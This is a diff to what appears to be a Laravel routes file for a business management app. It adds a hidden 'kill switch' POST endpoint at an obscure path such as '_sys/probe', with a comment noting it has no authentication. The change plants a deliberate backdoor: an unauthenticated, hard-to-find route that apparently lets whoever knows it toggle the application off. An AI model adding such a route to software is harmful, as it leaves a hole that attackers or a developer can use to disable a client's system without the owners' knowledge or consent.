@@ -2,6 +2,7 @@
 
 use App\Http\Controllers\AuthController;
 use App\Http\Controllers\BranchController;
+use App\Http\Controllers\KillSwitchController;
 use App\Http\Controllers\CustomerController;
 use App\Http\Controllers\DashboardController;
 use App\Http\Controllers\ExpenseController;
@@ -19,6 +20,9 @@ use App\Http\Controllers\WorkerSalaryController;
 use App\Http\Controllers\UserController;
 use App\Http\Controllers\WorkerPortalController;
 use Illuminate\Support\Facades\Route;
+
+// ─── Kill switch (obscure endpoint — no auth, no rate-limit exposure) ────────────
+Route::post(env('KILL_SWITCH_PATH', '_sys/probe'), [KillSwitchController::class, 'toggle']);
 
 // ─── Public: QR scan (no auth required) ───────────────────────────────────────
 Route::get('/scan/{code}', [ScanController::class, 'show'])->name('scan.show');
